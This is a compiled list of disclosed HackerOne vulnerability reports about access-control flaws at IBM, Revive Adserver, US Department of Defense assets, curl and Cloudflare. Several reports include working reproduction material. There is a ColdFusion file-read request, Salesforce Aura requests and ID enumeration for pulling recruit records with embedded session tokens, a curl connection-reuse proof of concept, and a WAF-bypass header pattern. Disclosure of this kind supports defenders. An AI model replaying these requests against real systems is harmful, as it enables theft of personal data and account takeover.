# Improper Access Control - Generic

_203 reports — High/Critical, disclosed_

### [Potential Subdomain Takeover on IBM.com domain.](https://hackerone.com/reports/3592387)

- **Report ID:** `3592387`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** IBM
- **Reporter:** @bugmithalchemist
- **Bounty:** - usd
- **Disclosed:** 2026-03-24T15:25:47.317Z
- **CVE(s):** -

**Summary (team):**

Potential Subdomain Takeover on IBM.com domain was reported to IBM, analyzed and has been remediated. Thank you to our external researcher @bugmithalchemist.

**Summary (researcher):**

Subdomain Takeover via Third-Party Dependency

---

### [[Critical] Unauthorized Cross-Tenant Data Access in Stripo AI Hub Campaign via Deleted Project.](https://hackerone.com/reports/3459285)

- **Report ID:** `3459285`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** Stripo Inc
- **Reporter:** @srcode
- **Bounty:** - usd
- **Disclosed:** 2026-01-20T16:01:37.369Z
- **CVE(s):** -

**Summary (team):**

resolved

---

### [Broken Access Control allows advertiser accounts to delete trackers they do not own](https://hackerone.com/reports/3445710)

- **Report ID:** `3445710`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Revive Adserver
- **Reporter:** @0xjad
- **Bounty:** - usd
- **Disclosed:** 2026-01-14T10:49:42.561Z
- **CVE(s):** CVE-2026-21641

**Summary (team):**

##Security advisory: [REVIVE-SA-2026-001](https://www.revive-adserver.com/security/revive-sa-2026-001/)

##Description 
HackerOne community member Jad Ghamloush (0xjad) has reported an authorization bypass vulnerability in the `tracker-delete.php` script of Revive Adserver. Users with permissions to delete trackers are mistakenly allowed to delete trackers owned by other accounts.
 
 ##Details 
The Revive Adserver `tracker-delete.php` script was not properly checking ownership of the `clientid` parameter before deleting the resource. That allows several types of malicious attacks and highly affects the data integrity of the affected system.

---

### [Unauthenticated File Read Adobe ColdFusion](https://hackerone.com/reports/2870951)

- **Report ID:** `2870951`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @silentbreach
- **Bounty:** - usd
- **Disclosed:** 2026-01-12T19:29:49.247Z
- **CVE(s):** CVE-2023-26360

**Vulnerability Information:**

Hi DOD,

I have found CVE-2023-26360 in ███. It leads to an Unauthenticated Arbitrary File Read vulnerability due to the de serialization of untrusted data in Adobe ColdFusion. The password **hash** is disclosed: `password=1B3C0648D519755588B7CE5BDBFD4A88E6C7998AF32309665E6966932720F3BA`


## References

- https://hackerone.com/reports/2248781

## Impact

The impact of this vulnerability could result in unauthorized access to sensitive data and actions within the affected Adobe ColdFusion instances.

## System Host(s)
afit.edu

## Affected Product(s) and Version(s)


## CVE Numbers
CVE-2023-26360

## Steps to Reproduce
1. Open Burpsuite set the target to ████
2. Use the exploit below:
```bash
POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=wizardHash&_cfclient=true&returnFormat=wddx&inPassword=foo HTTP/2
Host: ██████████
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Content-Length: 121
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate, br

_variables=%7b%22_metadata%22%3a%7b%22classname%22%3a%22i/../lib/password.properties%22%7d%2c%22_variables%22%3a%5b%5d%7d
```
3. The password hash is disclosed in the response: `password=1B3C0648D519755588B7CE5BDBFD4A88E6C7998AF32309665E6966932720F3BA`

## POC Video

████████

## Suggested Mitigation/Remediation Actions
Apply the necessary security patches or updates provided by Adobe to fix the vulnerability.

---

### [Air Force candidate PII + recruitment chat logs accessible via BAC/IDOR on █████████ (very large/significant exposure)](https://hackerone.com/reports/2968391)

- **Report ID:** `2968391`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @oxylis
- **Bounty:** - usd
- **Disclosed:** 2026-01-12T19:22:00.829Z
- **CVE(s):** -

**Vulnerability Information:**

Greetings DoD team,

I've uncovered another serious IDOR on a DoD-owned Salesforce asset (█████████).

Broken record-level configuration the Document object of this Salesforce instance allows  an attacker to retrieve a huge number of sensitive Air Force candidate records.

It is likely that these records are related to the Air Force recruiter live chat:█████. 

This is very problematic, as each log file contains a wealth of highly private personal information.

**Database fields include:**

Private chat logs between candidate/recruiter,
Full name,
Address,
Phone number,
Email address,
Medical data,
Drug use history,
Felony/Criminal history,
Academic data,

The contents of the chat logs themselves are also highly private, as candidates are frequently asked about personal details (medical/criminal/drug etc) by recruiters.

**Brief fuzzing of Id's + filesize indicates that hundreds of thousands of such records are currently exposed.**

███

█████████

## Impact

High impact/scale personal data leak.

## System Host(s)
████, █████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
#Steps to reproduce/POC

1. Register an account on https://████████/s/login/SelfRegister, you should be logged straight into the portal
2. After logging in, find any POST request to the /s/sfsites/aura endpoint - aura.token will be present, as below. Send this to Repeater.

```
POST /s/sfsites/aura?r=19&ui-comm-runtime-components-aura-components-siteforce-qb.Quarterback.getAllowedPostMessageOrigins=1 HTTP/2
Host: ███████
Cookie: renderCtx=%7B%22pageId%22%3A%224c254d1c-8f54-44e6-8f93-434d123e1f6f%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%22ae182506-2403-4c3c-8d77-69462fcc6184%22%2C%22audienceIds%22%3A%22%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; OptanonConsent=isGpcEnabled=1&datestamp=Fri+Jan+31+2025+15%3A40%3A52+GMT%2B0000+(Greenwich+Mean+Time)&version=202212.1.0&isIABGlobal=false&hosts=&landingPath=https%3A%2F%2F████%2Fapply-now&groups=C0001%3A1%2CC0003%3A1%2CSPD_BG%3A0%2CC0004%3A0%2CC0002%3A0; kndctr_9A3A4AEA5C01FFA90A495EEF_AdobeOrg_cluster=irl1; kndctr_9A3A4AEA5C01FFA90A495EEF_AdobeOrg_identity=CiYyMjc1MDM1Mzg1MzA0ODYwNzU5MDU0NTEwMzcxMzY2NDgwODY3NFITCOiBl-jLMhABGAEqBElSTDEwAPAB6IGX6Msy; AMCV_9A3A4AEA5C01FFA90A495EEF%40AdobeOrg=MCMID|22750353853048607590545103713664808674; ak_bmsc=B3E04778E36F4D7131079F5F4CB99768~000000000000000000000000000000~YAAQlrEXAnWwm5uUAQAAjAMGvRqcyA6e25MMo39CGW5l5wzdYui+RU5U6Jpe30Q9bQIv7U16JHfN+qev9NrCZ4NRhVUL3hv+SqVvQKflFUzk056OHlM27ZOL5G/jLiszcfiZqJ1NudMye8eLC4MPX7ENXPCYLjcKe1nC+aY2fkKKg26of33bm+VdyqM2UHBK4veL53A4By37Ou7fgS2ruOHTKREd0su3Ll6TABihtTrlvzbmMsbxR96TMY+vPaTTqHcghtqkZ4iNE814+kFakHX2yWPor9dVXJVOrTVHQbBnqem9n5xmOYpfkGe6hnjx30gNsddMmGkE4OIVkIQnF5BaEed3AvNSEHWkI65Q0FPsKdd80g4TU7GQN9qfnsYUICdlpJYyuYpR12Wr9w==; force-stream=!X2xQYLyIEeQ3rwu/bH3rPvwlR4HtllixEFFMt993L5YN/Af4vO8mOk1mKP9i8bLU59n3umKTH+W8uEY=; bm_sv=5CBA1975D035E99E5348E5BDA6FAB31E~YAAQorEXAkgMsbmUAQAAIxILvRqbqnYRcsZWXhwqtWsMi0vgOnQXhFzocmVM0N3UEYxteCab3LrEKOOwLD08oEK6X0nTsIAfONzth2bGw4w+eeG2yt5sOm4MePK515uzhFSVyHDaf3LhIy5kUdM0xGhObUUYB6Pwe2GgwQmguLOhhS3cBMzFMACpW275+2x/kmWcK9JOyDo8FLnBqhHhM1OXjCpQzat6dEBZ7KEq6wm0MqYLE3e4ghGZEK1NreAE/qND~1; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRG8wMDAwMDAwYWlyRg==; autocomplete=1; sid=00Do0000000airF!ARYAQIIfL2JihCfL8Vuo98N.d1Ve8o3uMDxdOBwAYGKq1E0SsQ5_61plkmpB_ZUSFajJt1Snul6PR7gMq8ylQMf4cnadWBxK; sid_Client=3000000gDzP0000000airF; clientSrc=███████; inst=APP_83; oid=00Do0000000airF; __Secure-has-sid=1; _ga_EYFLELGKGE=GS1.1.1738338117.1.1.1738338404.0.0.1518876090; _ga=GA1.1.1505934370.1738338118
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://████/s/
X-Sfdc-Page-Scope-Id: 5c3ae97f-d9f6-4089-9b5d-47ed77ed41b7
X-Sfdc-Request-Id: 29080000008771550d
X-Sfdc-Page-Cache: 287e41a6d43a67fe
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
X-B3-Traceid: 643ec2037b65b799
X-B3-Spanid: 896c3e74d9299601
X-B3-Sampled: 0
Content-Length: 1255
Origin: https://██████
Sec-Gpc: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

message=%7B%22actions%22%3A%5B%7B%22id%22%3A%22127%3Ba%22%2C%22descriptor%22%3A%22serviceComponent%3A%2F%2Fui.comm.runtime.components.aura.components.siteforce.qb.QuarterbackController%2FACTION%24getAllowedPostMessageOrigins%22%2C%22callingDescriptor%22%3A%22UNKNOWN%22%2C%22params%22%3A%7B%7D%7D%5D%7D&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AembeddedServiceSidebar%22%3A%221154_bQKJgTrtOZCM43YoejcSFg%22%2C%22COMPONENT%40markup%3A%2F%2Finstrumentation%3Ao11ySecondaryLoader%22%3A%22343_75unE-CE7CDfRvzL8FM_Uw%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2Fs%2F&aura.token=eyJub25jZSI6InRrRzVUQXR4dE9LSm9JOWRMSWRQOEFoWkh5aTVqVkl2UzRmb3l1UTRfVzhcdTAwM2QiLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IntcInRcIjpcIjAwRDgzMDAwMDAwOGFIdVwiLFwidlwiOlwiMDJHODMwMDAwMDAwWXFYXCIsXCJhXCI6XCJjYWltYW5zaWduZXJcIn0iLCJjcml0IjpbImlhdCJdLCJpYXQiOjE3MzgzMzg0MDQ2MjEsImV4cCI6MH0%3D..Z1upK8NszMzEbG7Y1USAsP1mvkFcsH4jy0rok3V_xpA%3D
```

3. Modify the request as below and send. This will call 2000 Document records (none of the ones listed in the response are sensitive).

```
POST /s/sfsites/aura?r=19&ui-comm-runtime-components-aura-components-siteforce-qb.Quarterback.getAllowedPostMessageOrigins=1 HTTP/2
Host: ███
Cookie: renderCtx=%7B%22pageId%22%3A%224c254d1c-8f54-44e6-8f93-434d123e1f6f%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%22ae182506-2403-4c3c-8d77-69462fcc6184%22%2C%22audienceIds%22%3A%22%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; OptanonConsent=isGpcEnabled=1&datestamp=Fri+Jan+31+2025+15%3A40%3A52+GMT%2B0000+(Greenwich+Mean+Time)&version=202212.1.0&isIABGlobal=false&hosts=&landingPath=https%3A%2F%2F██████████%2Fapply-now&groups=C0001%3A1%2CC0003%3A1%2CSPD_BG%3A0%2CC0004%3A0%2CC0002%3A0; kndctr_9A3A4AEA5C01FFA90A495EEF_AdobeOrg_cluster=irl1; kndctr_9A3A4AEA5C01FFA90A495EEF_AdobeOrg_identity=CiYyMjc1MDM1Mzg1MzA0ODYwNzU5MDU0NTEwMzcxMzY2NDgwODY3NFITCOiBl-jLMhABGAEqBElSTDEwAPAB6IGX6Msy; AMCV_9A3A4AEA5C01FFA90A495EEF%40AdobeOrg=MCMID|22750353853048607590545103713664808674; ak_bmsc=B3E04778E36F4D7131079F5F4CB99768~000000000000000000000000000000~YAAQlrEXAnWwm5uUAQAAjAMGvRqcyA6e25MMo39CGW5l5wzdYui+RU5U6Jpe30Q9bQIv7U16JHfN+qev9NrCZ4NRhVUL3hv+SqVvQKflFUzk056OHlM27ZOL5G/jLiszcfiZqJ1NudMye8eLC4MPX7ENXPCYLjcKe1nC+aY2fkKKg26of33bm+VdyqM2UHBK4veL53A4By37Ou7fgS2ruOHTKREd0su3Ll6TABihtTrlvzbmMsbxR96TMY+vPaTTqHcghtqkZ4iNE814+kFakHX2yWPor9dVXJVOrTVHQbBnqem9n5xmOYpfkGe6hnjx30gNsddMmGkE4OIVkIQnF5BaEed3AvNSEHWkI65Q0FPsKdd80g4TU7GQN9qfnsYUICdlpJYyuYpR12Wr9w==; force-stream=!X2xQYLyIEeQ3rwu/bH3rPvwlR4HtllixEFFMt993L5YN/Af4vO8mOk1mKP9i8bLU59n3umKTH+W8uEY=; bm_sv=5CBA1975D035E99E5348E5BDA6FAB31E~YAAQorEXAkgMsbmUAQAAIxILvRqbqnYRcsZWXhwqtWsMi0vgOnQXhFzocmVM0N3UEYxteCab3LrEKOOwLD08oEK6X0nTsIAfONzth2bGw4w+eeG2yt5sOm4MePK515uzhFSVyHDaf3LhIy5kUdM0xGhObUUYB6Pwe2GgwQmguLOhhS3cBMzFMACpW275+2x/kmWcK9JOyDo8FLnBqhHhM1OXjCpQzat6dEBZ7KEq6wm0MqYLE3e4ghGZEK1NreAE/qND~1; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRG8wMDAwMDAwYWlyRg==; autocomplete=1; sid=00Do0000000airF!ARYAQIIfL2JihCfL8Vuo98N.d1Ve8o3uMDxdOBwAYGKq1E0SsQ5_61plkmpB_ZUSFajJt1Snul6PR7gMq8ylQMf4cnadWBxK; sid_Client=3000000gDzP0000000airF; clientSrc=████; inst=APP_83; oid=00Do0000000airF; __Secure-has-sid=1; _ga_EYFLELGKGE=GS1.1.1738338117.1.1.1738338404.0.0.1518876090; _ga=GA1.1.1505934370.1738338118
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://████/s/
X-Sfdc-Page-Scope-Id: 5c3ae97f-d9f6-4089-9b5d-47ed77ed41b7
X-Sfdc-Request-Id: 29080000008771550d
X-Sfdc-Page-Cache: 287e41a6d43a67fe
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
X-B3-Traceid: 643ec2037b65b799
X-B3-Spanid: 896c3e74d9299601
X-B3-Sampled: 0
Content-Length: 1323
Origin: https://████
Sec-Gpc: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

message={"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"Document","layoutType":"FULL","pageSize":2000,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AembeddedServiceSidebar%22%3A%221154_bQKJgTrtOZCM43YoejcSFg%22%2C%22COMPONENT%40markup%3A%2F%2Finstrumentation%3Ao11ySecondaryLoader%22%3A%22343_75unE-CE7CDfRvzL8FM_Uw%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2Fs%2F&aura.token=eyJub25jZSI6InRrRzVUQXR4dE9LSm9JOWRMSWRQOEFoWkh5aTVqVkl2UzRmb3l1UTRfVzhcdTAwM2QiLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IntcInRcIjpcIjAwRDgzMDAwMDAwOGFIdVwiLFwidlwiOlwiMDJHODMwMDAwMDAwWXFYXCIsXCJhXCI6XCJjYWltYW5zaWduZXJcIn0iLCJjcml0IjpbImlhdCJdLCJpYXQiOjE3MzgzMzg0MDQ2MjEsImV4cCI6MH0%3D..Z1upK8NszMzEbG7Y1USAsP1mvkFcsH4jy0rok3V_xpA%3D
```
4. Extract one of the IDs from the response, e.g 015t0000000m7QgAAI.

5. Within the browser, enter this ID as follows to request the file:
https://████/servlet/servlet.FileDownload?file=015t0000000m7QgAAI

6. Generate a list of 'adjacent' IDs - within Salesforce these are semi-sequential (full methodology here: https://blog.hypn.za.net/2022/11/12/Hacking-Salesforce-backed-WebApps/). 

```
$python3 salesforceids1.py 015t0000000m7Qg -100000
015t0000000m7QfAAI
015t0000000m7QeAAI
015t0000000m7QdAAI
015t0000000m7QcAAI
015t0000000m7QbAAI
015t0000000m7QaAAI
015t0000000m7Q9AAI
015t0000000m7Q8AAI
015t0000000m7Q7AAI
015t0000000m7Q6AAI
(etc)
```

7. Run the attack within Intruder using the generated list using the FileDownload GET method as above. Very quickly this starts unearthing sensitive files.

8. Verify examples below - discovered via fuzzing this way:

(open in logged-in browser session)

https://████/servlet/servlet.FileDownload?file=015t0000000m74LAAQ
https://█████████/servlet/servlet.FileDownload?file=015t0000000m75iAAA
https://████████/servlet/servlet.FileDownload?file=015t0000000m79zAAA

#

Hope you find this report helpful - look forward to your feedback.

## Suggested Mitigation/Remediation Actions

---

### [HAProxy Connection Reuse leads to IP Spoofing and mTLS Context Smuggling](https://hackerone.com/reports/3475613)

- **Report ID:** `3475613`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** curl
- **Reporter:** @anonymous_237
- **Bounty:** - usd
- **Disclosed:** 2025-12-23T13:51:42.667Z
- **CVE(s):** -

**Vulnerability Information:**

##Executive Summary

`libcurl` fails to respect the `CURLOPT_HAPROXY_CLIENT_IP` configuration when reusing existing connections. Due to a missing check in the connection pooling logic, `libcurl` indiscriminately reuses a TCP/TLS connection established with a specific identity (IP A) for subsequent requests requiring a different identity (IP B).

Since the HAProxy PROXY protocol header is immutable and only sent during the initial connection handshake, the upstream server attributes the new request to the **previous identity**. This allows a low-privileged request to tunnel through a connection established by a high-privileged user, bypassing IP-based ACLs and inheriting the authenticated mTLS context of the previous session.

## Technical Root Cause Analysis
The vulnerability stems from an architectural omission introduced when `CURLOPT_HAPROXY_CLIENT_IP` was added in version 8.2.0.

1.  **Missing State Storage (`lib/urldata.h`):** The `struct connectdata` (which represents an active connection) does not store the `haproxy_client_ip` used at creation time. The identity information is ephemeral and lost immediately after the handshake.
2.  **Defective Matching Logic (`lib/url.c`):** The `ConnectionExists()` function checks for host, port, protocol, and credentials (username/password) matches but **ignores** `CURLOPT_HAPROXY_CLIENT_IP`. Since the connection structure doesn't hold the old value, a comparison is impossible in the current architecture.
3.  **Violation of API Contract:** The documentation states the IP is sent "at the beginning of the connection". By reusing a connection where the header was already sent with a different value, `libcurl` violates this contract.


##Affected version

curl -V
WARNING: this libcurl is Debug-enabled, do not use in production

curl 8.18.0-DEV (x86_64-pc-linux-gnu) libcurl/8.18.0-DEV wolfSSL/5.8.4 libidn2/2.3.3 libpsl/0.21.2 ngtcp2/1.19.0-DEV nghttp3/1.1
Release-Date: [unreleased]
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns mqtt pop3 pop3s rtsp smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS Debug HSTS HTTP3 HTTPS-proxy IDN IPv6 Largefile PSL SSL threadsafe TrackMemory UnixSockets


 cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
NAME="Debian GNU/Linux"
VERSION_ID="12"
VERSION="12 (bookworm)"
VERSION_CODENAME=bookworm
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"


## Proof of Concept 

### A. The Vulnerable Client (`poc.c`)
*Compile with:* `gcc -o poc poc.c -lcurl`

```c

#include <stdio.h>
#include <curl/curl.h>
#include <unistd.h>

int main(void) {
  CURL *curl;
  CURLcode res;

  curl_global_init(CURL_GLOBAL_ALL);
  curl = curl_easy_init();

  if(curl) {
    printf("--- PoC: CRITICAL IDENTITY HIJACKING ---\n");

    // Configuration Commune
    curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:8080/");
    curl_easy_setopt(curl, CURLOPT_HAPROXYPROTOCOL, 1L);
    curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L); // Force Reuse
    curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L);

    // --- PHASE 1 : TRANSACTION ADMIN ---
    printf("\n[STEP 1] Executing ADMIN Transaction (IP: 10.0.0.1)...\n");
    curl_easy_setopt(curl, CURLOPT_HAPROXY_CLIENT_IP, "10.0.0.1");
    
    res = curl_easy_perform(curl);
    if(res == CURLE_OK) printf("-> Admin Request Sent.\n");

    // Petite pause pour bien séparer les logs visuellement
    sleep(1);

    // --- PHASE 2 : TRANSACTION GUEST (L'ATTAQUE) ---
    printf("\n[STEP 2] Executing GUEST Transaction (IP: 66.66.66.66)...\n");
    printf("EXPECTED: New Connection with Identity 66.66.66.66\n");
    printf("ACTUAL:   Reuse Connection with Identity 10.0.0.1 (PRIVILEGE ESCALATION)\n");
    
    // Changement d'identité : CELA DEVRAIT FORCER UNE NOUVELLE CONNEXION
    curl_easy_setopt(curl, CURLOPT_HAPROXY_CLIENT_IP, "66.66.66.66");
    
    res = curl_easy_perform(curl);
    if(res == CURLE_OK) printf("-> Guest Request Sent.\n");

    curl_easy_cleanup(curl);
  }
  curl_global_cleanup();
  return 0;
}

```

### B. The Victim Server 


```python

#!/usr/bin/env python3
import socket
import sys
import time

# Configuration
HOST = '127.0.0.1'
PORT = 8080

def start_server():
    print(f"[*] BANK BACKEND listening on {HOST}:{PORT}")
    print("[*] Waiting for HAProxy connections...")
    
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, PORT))
    server_socket.listen(5)

    try:
        while True:
            client_sock, addr = server_socket.accept()
            print(f"\n[+] NEW SECURE CHANNEL OPENED from {addr}")
            
            # Identité de la connexion (Liée au socket TCP)
            current_identity = "UNKNOWN"
            
            with client_sock:
                # Lecture initiale (Handshake)
                data = client_sock.recv(4096).decode('utf-8', errors='ignore')
                
                # Parsing de l'identité HAProxy (PROXY TCP4 IP_SRC ...)
                if data.startswith('PROXY'):
                    parts = data.split(' ')
                    if len(parts) > 2:
                        current_identity = parts[2] # L'IP source
                        print(f"    [SECURITY] PROXY HEADER RECEIVED. IDENTITY LOCKED: {current_identity}")
                        
                        # Simulation ACL
                        if current_identity == "10.0.0.1":
                            print("    [ACL] ROLE: ADMIN (High Privilege)")
                        else:
                            print("    [ACL] ROLE: GUEST (Low Privilege)")
                
                # Réponse à la 1ère requête
                response = "HTTP/1.1 200 OK\r\nContent-Length: 5\r\nConnection: keep-alive\r\n\r\nDONE\n"
                client_sock.sendall(response.encode())

                # --- LA FAILLE : RÉUTILISATION ---
                # On attend une 2ème requête sur le MÊME canal
                client_sock.settimeout(2.0)
                try:
                    while True:
                        data = client_sock.recv(4096)
                        if not data: break
                        
                        print(f"\n    [!!!] NEW REQUEST RECEIVED ON EXISTING CHANNEL")
                        print(f"    [!!!] CRITICAL: REUSING LOCKED IDENTITY: {current_identity}")
                        
                        if current_identity == "10.0.0.1":
                            print("    [ACCESS CONTROL] ACTION AUTHORIZED (Inherited Admin Privileges)")
                        else:
                            print("    [ACCESS CONTROL] ACTION DENIED")
                            
                        client_sock.sendall(response.encode())
                except socket.timeout:
                    print("    [-] Connection idle.")

    except KeyboardInterrupt:
        print("\n[*] Stopping server.")
    finally:
        server_socket.close()

if __name__ == '__main__':
    start_server()

```
output : 

```
 python3 bank_server.py 
[*] BANK BACKEND listening on 127.0.0.1:8080
[*] Waiting for HAProxy connections...

[+] NEW SECURE CHANNEL OPENED from ('127.0.0.1', 45200)
    [SECURITY] PROXY HEADER RECEIVED. IDENTITY LOCKED: 10.0.0.1
    [ACL] ROLE: ADMIN (High Privilege)

    [!!!] NEW REQUEST RECEIVED ON EXISTING CHANNEL
    [!!!] CRITICAL: REUSING LOCKED IDENTITY: 10.0.0.1
    [ACCESS CONTROL] ACTION AUTHORIZED (Inherited Admin Privileges)
```

## Impact

## Impact

**1. IP-Based Access Control Bypass (ACLs)**

**2. mTLS Context Smuggling **
In architectures using Mutual TLS (mTLS), the client identity is bound to the underlying TCP/TLS connection.
If `libcurl` reuses a connection established with a high-privileged Client Certificate (e.g., Admin) for a subsequent request intended for a low-privileged context (e.g., Guest), the second request **inherits the authenticated TLS context** of the first. This allows a low-privileged user to tunnel requests through an authenticated session, effectively hijacking the previous user's identity.

**3. Audit Trail Corruption**
Security logs on the upstream server will incorrectly attribute malicious or unauthorized actions to the identity of the initial connection owner. 

**4. Violation of API Contract**
Users explicitly setting `CURLOPT_HAPROXY_CLIENT_IP` expect `libcurl` to present that specific identity to the server. Ignoring this parameter during connection reuse silently violates the security expectations of the application developer.

---

### [Authorization bypass allows changing email address of other users](https://hackerone.com/reports/3398283)

- **Report ID:** `3398283`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Revive Adserver
- **Reporter:** @yoyomiski
- **Bounty:** - usd
- **Disclosed:** 2025-11-19T09:32:13.454Z
- **CVE(s):** CVE-2025-48986

**Vulnerability Information:**

==Version: Revive Adserver 6.0.0==

##Summary:
The Change E-mail UI requires the current password, but the admin panel endpoint /admin/agency-user.php accepts a POST that updates a user’s email (including admin) without requiring the account password. The application does not require re-authentication before updating email addresses.

##Step to reproduce:
1. Log in page
2. Go to Preferences → Change E-mail, observe that changing the email normally requires the current password.

██████
3. Navigate to Inventory → User Access, select the admin user, and click Save changes while intercepting the request.
4. Modify and send the following request:
`submit=1&login=admin&token=ba6ff2f70a69a509d5bcc84cb2225517&userid=1&email_address=another-mail@example.com&agencyid=1`

{F4929064}
5. Observe that the admin user’s email is successfully updated without password confirmation.

███████

## Impact

- An authenticated attacker (with access to the User Access page) can change the administrator’s email address without authorization, potentially leading to account takeover or loss of access control integrity.

VIdeo PoC: ██████

---

### [Bypass of Cloudflare's Cache Keys and WAF via header overflow](https://hackerone.com/reports/3027461)

- **Report ID:** `3027461`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Cloudflare Public Bug Bounty
- **Reporter:** @david96
- **Bounty:** - usd
- **Disclosed:** 2025-11-18T08:08:43.770Z
- **CVE(s):** -

**Summary (team):**

A limitation in our HTTP request header parsing in Front Line (FL) processing enables attackers to bypass defined rulesets. The maximum amount of headers being parsed by openresty is 100 HTTP headers including internal ones. This problem applies to any ruleset on HTTP headers. Attackers are able to bypass for instance WAF rules and perform cache forcing/poisoning. Our WAF team implemented a global rule to block, when too many headers were provided (https://developers.cloudflare.com/changelog/2025-10-20-waf-release/), which is recommended to be enabled.
We want to emphasize that https://developers.cloudflare.com/ruleset-engine/rules-language/fields/reference/http.request.headers.truncated/ indicates if rulesets is not seeing all the request headers. Moreover, the length problem of parsed HTTP headers will be mitigated with the rollout of our new Front Line implementation.

**Summary (researcher):**

# Summary

A vulnerability in HTTP request header processing allowed attackers to exploit cache poisoning attacks on all Cloudflare customers. By appending a keyed header after an overflow triggered by exceeding ``94`` headers, attackers could manipulate cache behavior.
- The vulnerability enabled attackers to bypass Cloudflare’s Cache Key configuration, refer to [Cloudflare Cache Key documentation](https://developers.cloudflare.com/cache/how-to/cache-keys/). Both custom and default keyed headers were excluded from the Cache Key evaluation when the header count exceeded ``94``.

- This also allowed attackers to force caching of assets not intended for caching, bypassing [Cache Rules](https://developers.cloudflare.com/cache/how-to/cache-rules/). For example, responses configured to avoid caching based on specific headers or cookies were cached.

- When the header count surpassed ``94``, Cloudflare’s evaluation of Cache Rules, Custom Cache Keys, and Default Cache Keys ceased.

e.g

```
[94+ headers with arbitrary data]
1: 1
1: 1
1: 1
1: 1
1: 1
1: 1
X-HTTP-Method-Override: HEAD
Host: victim.com
...
```

Attackers could add a header initially in the cache key (e.g., ``X-HTTP-Method-Override``) to manipulate the response and cache incorrect or malicious content to be served in subsequent responses. 

This led to cache poisoning denial of service, and stored XSS attacks.

## WAF Bypass

Attackers could also bypass Cloudflare’s Web Application Firewall (WAF) and both [custom and managed firewall rules](https://developers.cloudflare.com/waf/custom-rules/), allowing malicious requests to reach the origin server uninspected.

